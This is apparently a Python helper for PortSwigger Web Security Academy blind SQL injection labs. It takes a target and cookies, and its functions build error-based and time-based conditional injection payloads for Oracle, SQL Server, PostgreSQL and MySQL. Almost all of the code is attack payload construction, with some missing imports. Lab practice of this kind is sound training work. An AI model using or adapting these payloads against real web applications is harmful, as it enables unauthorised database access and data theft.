import argparse
import string

headers = "{ \
  'Host': '', \
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0', \
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', \
  'Accept-Language': 'en-GB,en;q=0.5', \
  'Accept-Encoding': 'gzip, deflate', \
  'Referer': '', \
  'Upgrade-Insecure-Requests': '1', \
  'Sec-Fetch-Dest': 'document', \
  'Sec-Fetch-Mode': 'navigate', \
  'Sec-Fetch-Site': 'same-origin', \
  'Sec-Fetch-User': '?1', \
  'Te': 'trailers' \
}"

def args():
  # configure arguments
  parser = argparse.ArgumentParser(description='PortSwigger Blind SQLi')
  parser.add_argument('-v', '--verbose', action='store_true')
  parser.add_argument('-t', '--target', help='target address', required=True)
  parser.add_argument('-c', '--cookies', help='cookies', required=True)
  arguments = parser.parse_args()
  return arguments.verbose, arguments.target, arguments.cookies

def prepare_lc_alphanumeric_data():
  return list(map(str, range(0,10))) + list(string.ascii_lowercase)

def interrupt_handler(signum, frame):
  print(f'Handling signal {signum} ({signal.Signals(signum).name}).')

  sys.exit(0)

def sqli_cond_error(sql_main_conditional, db_type):
  # sql error condition: https://portswigger.net/web-security/sql-injection/cheat-sheet
  sql = None
  if db_type == 'Oracle':
    sql = f"' AND (SELECT CASE WHEN ({sql_main_conditional}) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a"
  elif db_type == 'Microsoft':
    sql = f"' AND (SELECT CASE WHEN ({sql_main_conditional}) THEN 1/0 ELSE NULL END)='a"
  elif db_type == 'PostgreSQL':
    sql = f"' AND (SELECT CASE WHEN ({sql_main_conditional}) THEN 1/(SELECT 0) ELSE NULL END)='a"
  elif db_type == 'MySQL':
    sql = f"SELECT IF({sql_main_conditional},(SELECT table_name FROM information_schema.tables),'a')"

  return sql

def sqli_cond_timeout(sql_main_conditional, db_type, timeout):
  # sql error condition: https://portswigger.net/web-security/sql-injection/cheat-sheet
  sql = None
  if db_type == 'Oracle':
    sql = f"' AND (SELECT CASE WHEN ({sql_main_conditional}) THEN dbms_pipe.receive_message(('a'),{timeout}) ELSE 'a' END FROM dual)='a"
  elif db_type == 'Microsoft':
    sql = f"' AND (SELECT CASE WHEN ({sql_main_conditional}) THEN WAITFOR DELAY '0:0:{timeout}' ELSE 'a' END)='a"
  elif db_type == 'PostgreSQL':
    # note - needed to do string concatentation to get the pg_sleep call to work 'a'||pg_sleep(10)
    # base command: "' AND (SELECT 'a'||pg_sleep(2)) = 'a"
    sql = f"' AND 'a' = (SELECT CASE WHEN ({sql_main_conditional}) THEN 'a'||pg_sleep({timeout}) ELSE 'b'||pg_sleep(0) END)--"
  elif db_type == 'MySQL':
    sql = f"SELECT IF({sql_main_conditional},(SELECT SLEEP({timeout})),'a')"

  return sql
